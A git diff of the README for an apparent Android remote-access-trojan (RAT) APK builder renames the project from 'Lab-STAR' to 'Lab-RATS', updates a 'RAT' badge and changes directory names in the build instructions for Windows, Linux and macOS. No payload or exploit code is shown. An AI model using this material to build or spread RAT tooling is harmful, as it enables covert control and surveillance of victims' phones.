@@ -8,16 +8,16 @@
  │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │
  │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │
  │                                                              │
- │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │
+ │ PROJECT: Lab-RATS APK Builder | v1.5.0 Hardened              │
  │ GIT_UPLINK: https://github.com/K4N3CO/Lab-STAR           │
  │                                                              │
  └──────────────────────────────────────────────────────────────┘
 ```
 
-# 🔥 Lab-STAR APK Builder
+# 🔥 Lab-RATS APK Builder
 
 <p align="center">
-  <a href="https://github.com/K4N3CO"><img src="https://img.shields.io/badge/K4N3CO-RAT-red?style=for-the-badge" alt="K4N3CO"></a>
+  <a href="https://github.com/K4N3CO"><img src="https://img.shields.io/badge/K4N3CO.LAB-RATS-red?style=for-the-badge" alt="K4N3CO"></a>
 </p>
 
 ---
@@ -52,21 +52,21 @@
 **PowerShell (Recommended)**
 
 ```powershell
-cd Lab-STAR-main/apk-builder
+cd Lab-RATS/apk-builder
 .\build.ps1
 ```
 
 **Command Prompt**
 
 ```cmd
-cd Lab-STAR-main/apk-builder
+cd Lab-RATS-main/apk-builder
 build.bat
 ```
 
 ### Linux / macOS
 
 ```bash
-cd Lab-STAR-main/apk-builder
+cd Lab-RATS-main/apk-builder
 chmod +x build.sh
 ./build.sh
 ```
